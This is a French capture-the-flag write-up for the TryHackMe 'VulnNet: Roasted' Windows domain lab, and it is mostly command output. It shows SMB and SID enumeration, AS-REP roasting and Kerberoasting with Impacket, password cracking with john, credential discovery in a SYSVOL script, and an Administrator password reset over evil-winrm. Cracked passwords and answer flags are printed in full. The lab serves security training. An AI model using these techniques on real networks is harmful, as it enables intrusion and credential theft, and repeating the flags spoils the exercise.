# VulnNet: Roasted #

## Task 1 VulnNet: Roasted ##

```bash
tim@kali:~/Bureau/tryhackme$ sudo sh -c "echo '10.10.111.3 roasted.thm' >> /etc/hosts" 
[sudo] Mot de passe de tim : 

tim@kali:~/Bureau/tryhackme$ sudo nmap -A roasted.thm -p-
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-16 09:42 CEST
Nmap scan report for roasted.thm (10.10.111.3)
Host is up (0.055s latency).
Not shown: 65517 filtered ports
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2021-08-16 07:44:51Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49669/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  msrpc             Microsoft Windows RPC
49691/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-08-16T07:45:47
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   33.29 ms 10.9.0.1
2   35.67 ms roasted.thm (10.10.111.3)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 265.39 seconds

```

On remarque qu'il a plusieurs services : SMB,DNS,kerberos, HTTP, etc...   
Nmap nous indique aussi que l'on sur une machine windows.    


```bash
tim@kali:~/Bureau/tryhackme$ smbclient -L \\roasted.thm
Enter WORKGROUP\tim's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	VulnNet-Business-Anonymous Disk      VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing
SMB1 disabled -- no workgroup available
```

On on voit qu'il y a plusieurs partage activés.  

```bash
tim@kali:~/Bureau/tryhackme$ smbclient \\\\roasted.thm\\VulnNet-Business-Anonymous
Enter WORKGROUP\tim's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar 13 03:46:40 2021
  ..                                  D        0  Sat Mar 13 03:46:40 2021
  Business-Manager.txt                A      758  Fri Mar 12 02:24:34 2021
  Business-Sections.txt               A      654  Fri Mar 12 02:24:34 2021
  Business-Tracking.txt               A      471  Fri Mar 12 02:24:34 2021

		8771839 blocks of size 4096. 4537581 blocks available
smb: \> mget *
Get file Business-Manager.txt? y
getting file \Business-Manager.txt of size 758 as Business-Manager.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)
Get file Business-Sections.txt? y
getting file \Business-Sections.txt of size 654 as Business-Sections.txt (0,4 KiloBytes/sec) (average 0,3 KiloBytes/sec)
Get file Business-Tracking.txt? y
getting file \Business-Tracking.txt of size 471 as Business-Tracking.txt (0,2 KiloBytes/sec) (average 0,3 KiloBytes/sec)
smb: \> exit

tim@kali:~/Bureau/tryhackme$ smbclient \\\\roasted.thm\\VulnNet-Enterprise-Anonymous
Enter WORKGROUP\tim's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Mar 13 03:46:40 2021
  ..                                  D        0  Sat Mar 13 03:46:40 2021
  Enterprise-Operations.txt           A      467  Fri Mar 12 02:24:34 2021
  Enterprise-Safety.txt               A      503  Fri Mar 12 02:24:34 2021
  Enterprise-Sync.txt                 A      496  Fri Mar 12 02:24:34 2021

		8771839 blocks of size 4096. 4555028 blocks available
smb: \> mget *
Get file Enterprise-Operations.txt? y
getting file \Enterprise-Operations.txt of size 467 as Enterprise-Operations.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
Get file Enterprise-Safety.txt? y
getting file \Enterprise-Safety.txt of size 503 as Enterprise-Safety.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
Get file Enterprise-Sync.txt? y
getting file \Enterprise-Sync.txt of size 496 as Enterprise-Sync.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
smb: \> exit
```

On récupère les fichiers.     

```bash
tim@kali:~/Bureau/tryhackme$ cat Business-Manager.txt | head -4
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Alexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. 


tim@kali:~/Bureau/tryhackme$ cat Business-Sections.txt | head -4
VULNNET BUSINESS
~~~~~~~~~~~~~~~~~~~

Jack Goldenhand is the person you should reach to for any business unrelated proposals.

tim@kali:~/Bureau/tryhackme$ cat Enterprise-Safety.txt | head -4
VULNNET SAFETY
~~~~~~~~~~~~~~~~

Tony Skid is a core security manager and takes care of internal infrastructure.
tim@kali:~/Bureau/tryhackme$ cat Enterprise-Sync.txt | head -4

VULNNET SYNC
~~~~~~~~~~~~~~

Johnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.
```

Au début de certain fichiers on trouve des noms.   
Alexa Whitehat   
Jack Goldenhand    
Tony Skid      
Johnny Leet   

```bash
tim@kali:~/Bureau/tryhackme$ lookupsid.py  anonymous@roasted.thm
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at roasted.thm
[*] StringBinding ncacn_np:roasted.thm[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

On enumère les utilisateurs on reconnais nos 4 utilisateurs.  
a-whitehat   
t-skid    
j-goldenhand   
j-leet    

Ils sont sur le domaine VULNNET-RST. 

```bash
tim@kali:~/Bureau/tryhackme$ echo "a-whitehat" > user.txt
tim@kali:~/Bureau/tryhackme$ echo "t-skid" >> user.txt
tim@kali:~/Bureau/tryhackme$ echo "j-goldenhand" >> user.txt
tim@kali:~/Bureau/tryhackme$ echo "j-leet" >> user.txt

tim@kali:~/Bureau/tryhackme$ GetNPUsers.py 'VULNNET-RST/' -usersfile user.txt -no-pass -dc-ip roasted.thm
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST:4f56af8cf1af12786a3e128ee2fcb112$eaf276c9ac80bf9bfbc40e1b7428d21c540e7c94f771b4a6d76840d32dbeb1c6e526c70e082b3455435801e1c1abfa38120a82891b1658164151242be7fc5279159c136d3967d1db77635fd9321fd06e4bcff5b64675f19075da609ea0389a310aa8e6c2a9563b930e0fc5b8a38e8aef125cb4d8772022c79a6d50328724feb7de9dc27df933e63121725a3819000a0bc0c8102a9a3a9c6f0a3422a54598edc041a94f07ee739c70cf220e83a24c05750e8270d14e3da23ad9f691915b86d95b3dbfc8f351a4a39c36a1a92779b87d35fa8b8007afdbfe72a64eeff8207b21fb7bd159cbbe120f79cdd89c534ca27edb
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

On récupère le hash de skid.    

```bash
tim@kali:~/Bureau/tryhackme$ echo '$krb5asrep$23$t-skid@VULNNET-RST:4f56af8cf1af12786a3e128ee2fcb112$eaf276c9ac80bf9bfbc40e1b7428d21c540e7c94f771b4a6d76840d32dbeb1c6e526c70e082b3455435801e1c1abfa38120a82891b1658164151242be7fc5279159c136d3967d1db77635fd9321fd06e4bcff5b64675f19075da609ea0389a310aa8e6c2a9563b930e0fc5b8a38e8aef125cb4d8772022c79a6d50328724feb7de9dc27df933e63121725a3819000a0bc0c8102a9a3a9c6f0a3422a54598edc041a94f07ee739c70cf220e83a24c05750e8270d14e3da23ad9f691915b86d95b3dbfc8f351a4a39c36a1a92779b87d35fa8b8007afdbfe72a64eeff8207b21fb7bd159cbbe120f79cdd89c534ca27edb' > hash

tim@kali:~/Bureau/tryhackme$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj072889*        ($krb5asrep$23$t-skid@VULNNET-RST)
1g 0:00:00:01 DONE (2021-08-16 10:29) 0.5208g/s 1655Kp/s 1655Kc/s 1655KC/s tjalling..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

On casse le hash avec john.    
Le mot de passe est : tj072889*    

```bash
tim@kali:~/Bureau/tryhackme$ GetUserSPNs.py 'VULNNET-RST.local/t-skid:tj072889*' -dc-ip roasted.thm
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName    Name                MemberOf                                                       PasswordLastSet             LastLogon                   Delegation 
----------------------  ------------------  -------------------------------------------------------------  --------------------------  --------------------------  ----------
CIFS/vulnnet-rst.local  enterprise-core-vn  CN=Remote Management Users,CN=Builtin,DC=vulnnet-rst,DC=local  2021-03-11 20:45:09.913979  2021-03-14 00:41:17.987528             

tim@kali:~/Bureau/tryhackme$ cat hash2.txt 
$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$VULNNET-RST.local/enterprise-core-vn*$f510939beffe0dd3e9211e89e5085561$75ef8bf14be47f968f4bbd48f4d273ea75316bdd97b02c9b00391b2d53442bead57222cdbeefec3259ad0d6ae94c457025d1c26ca579913830b83ddeb06f1f5ffe74fba7394bd15988ae5351b7cb474bc136d112960a28c11eba4762f4572367d19eaa596deafb9b79fa9a0878dab77cfa9d10b641be0d11bd1cb5e3fa7d469e7182b80b4b002b48f4e51f5f2f9322d7b9f803f2480cf55405d01e6a24d1116b3a500c11c39006c4b6521d4f0ec3dfb835a993dbc28bfe68cedcfda9f101f6384b8926b6ac2388efbfac97420a145f2027d2525aa9e6dce893da801248919a1b912c46fb158d9899530c437507beb2bde54641972988ec62a018b250b471ecc378c6468025aa2c5f2930a7ae0862d267d0fd9d2cb40a1cb19029d094d1f073f13bc2d64bb04e6b4fc16ebab3c6131a97dc1b44afac5f43c10406b11486a29d49aa5a7afdf669e92f5756a9b09ff7a5ea916344e397b19d2516ef7b2a92ec2b6e621301641ed9387a984ff90b5815348db40b6d1e79838f1720451d9f0aea344e850c033020faa7646547382bfe6d011c87605039a84a80acfcba5cee01ad6bcbf89ee9f8bc3bf27316261604b6bc41145fbfa326730c7a9e9a80399b54e5f6b1f775cb2f469f467144d08b5f0174f9ffbceb7d93da6f1798ed41dbacda6d3ad75d858f1ca77b33f047f9ed196fc9ba327084690228f756846a1ba8a496cdaf1caa6856e5da114ce82cce8918c018ac11b2b3f8628cfacbe6f17a8a4a98610e60add97f1b14b1df30d7e3b4655d8dab84dec2daa27eaea1863860011723603b9c39ee09c858af638010a277c988e45dbab7ced80f561b25ecb89293c2a254fa8f242b3760c3bc820525d6bf22d1508e33b640516decf4320d6f3f7d4c4ad6e55fdd242e0cf7a6dc74c7a4aff753b94fe34d5c718e35079380e393f2345c9ad34095fea326dfe6e6dcc76f360ea25b05d383b70899e2259deebc3e75c4daccf63dfc334e444de6b5254ef4fff4856eaa07f97a2fb96af86d6e43cb3542b0ed448c1b1ea47da6b844153cb18444b74b384a21aafcca5811beae210c0d2eb947be40327b7cd94e57d0f93f7da7c5e72789814f7a88ef7a4439661d8d6f9fe01da9f210f020daa1dd51f0482fe1f7587dd696b5733763eb87a7928ada381659eaaee55bb174805dfd3008f6a931b59d64bc37ed18dc7375bf4bf932aea889a824f411e34f80c40ae487bdfe1e8307331bb8d56ece55c096de5165fb6bdb2bdc54df1e3aec28873b756b15381b2ece2cb0543b620466dc6a6d3c971aa2bdf08a8035a747774fafbcd5950aa1fffe7ed661b25ce6cb38afdd1adda910e5c5b54e15829782c77684aa1e9b0823ff4a78b7d692b84bc008894fb2ba1c8858f71196

```

Avec les identifiants on récupère un deuxième hash.   

```bash
tim@kali:~/Bureau/tryhackme$ john hash2.txt -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ry=ibfkfv,s6h,   (?)
1g 0:00:00:01 DONE (2021-08-16 10:37) 0.6211g/s 2551Kp/s 2551Kc/s 2551KC/s ryan2lauren..ry=iIyD{N
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

On casse le hash avec john the ripper.   
On trouve un mot de passe qui est : ry=ibfkfv,s6h,  

**What is the user flag? (Desktop\user.txt)**

```bash

tim@kali:~/Bureau/tryhackme$ evil-winrm  -i roasted.thm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\enterprise-core-vn\desktop> dir


    Directory: C:\Users\enterprise-core-vn\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt
*Evil-WinRM* PS C:\Users\enterprise-core-vn\desktop> type user.txt
*Evil-WinRM* PS C:\Users\enterprise-core-vn\desktop> type user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}
```

On établie une connexion avec evil.   
On trouve un fichier sur le bureau.   
On regarde le fichier.    

La réponse est : THM{726b7c0baaac1455d05c827b5561f4ed}    

```bash
tim@kali:~/Bureau/tryhackme$ smbmap -H roasted.thm -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'
[+] IP: roasted.thm:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	VulnNet-Business-Anonymous                        	READ ONLY	VulnNet Business Sharing
	VulnNet-Enterprise-Anonymous                      	READ ONLY	VulnNet Enterprise Sharing
```

Nous avons un nouveau partage disponible en écriture qui est : SYSVOL   

```bash
tim@kali:~/Bureau/tryhackme$ smbclient  //roasted.thm/SYSVOL --user=enterprise-core-vn
Enter WORKGROUP\enterprise-core-vn's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 11 20:19:49 2021
  ..                                  D        0  Thu Mar 11 20:19:49 2021
  vulnnet-rst.local                  Dr        0  Thu Mar 11 20:19:49 2021

		8771839 blocks of size 4096. 4537710 blocks available
smb: \> cd vulnnet-rst.local
smb: \vulnnet-rst.local\> ls
  .                                   D        0  Thu Mar 11 20:23:40 2021
  ..                                  D        0  Thu Mar 11 20:23:40 2021
  DfsrPrivate                      DHSr        0  Thu Mar 11 20:23:40 2021
  Policies                            D        0  Thu Mar 11 20:20:26 2021
  scripts                             D        0  Wed Mar 17 00:15:49 2021

		8771839 blocks of size 4096. 4555247 blocks available
smb: \vulnnet-rst.local\> cd scripts\
smb: \vulnnet-rst.local\scripts\> ls
  .                                   D        0  Wed Mar 17 00:15:49 2021
  ..                                  D        0  Wed Mar 17 00:15:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 00:18:14 2021

		8771839 blocks of size 4096. 4555247 blocks available
smb: \vulnnet-rst.local\scripts\> mget *
Get file ResetPassword.vbs? y
getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetPassword.vbs (0,4 KiloBytes/sec) (average 0,4 KiloBytes/sec)
smb: \vulnnet-rst.local\scripts\> exit

tim@kali:~/Bureau/tryhackme$ cat ResetPassword.vbs | head -20
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName

' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1

If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End If

strUserNTName = "a-whitehat"
strPassword = "bNdKVkjv3RR9ht"

' Determine DNS domain name from RootDSE object.

```

On se connect sur SYSVOL.   
Dans le répertoire scripts on remarque un fichier en visual basic.  
On télécharge le fichier.   
En regardant à l'interieur on découvre des identifiants.  
Les identifiants sont : 
Nom : a-whitehat   
Mot de passe : bNdKVkjv3RR9ht      


```bash
tim@kali:~/Bureau/tryhackme$ evil-winrm -i roasted.thm -u a-whitehat -p bNdKVkjv3RR9ht

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\a-whitehat\Documents> 
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> whoami /all

USER INFORMATION
----------------

User Name              SID
====================== =============================================
vulnnet-rst\a-whitehat S-1-5-21-1589833671-435344116-4136949213-1105


GROUP INFORMATION
-----------------

Group Name                                         Type             SID                                          Attributes
================================================== ================ ============================================ ===============================================================
Everyone                                           Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                      Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access         Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                             Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                               Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                   Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                     Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Domain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
VULNNET-RST\Denied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level               Label            S-1-16-12288

```

On remarque que faisont partie du group Admins.   

```bash
*Evil-WinRM* PS C:\Users\a-whitehat\Documents> net user Administrator toto1234*
The command completed successfully.
```

On change de mot de passe.    

```bash
tim@kali:~/Bureau/tryhackme$ evil-winrm -i roasted.thm -u Administrator  -p toto1234*

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}

```

On se connect avec notre nouveau mot de passe.   
On trouve un fichier system.txt dans le Bureau.   
On regarde le fichier.   

La réponse est : THM{16f45e3934293a57645f8d7bf71d8d4c}    
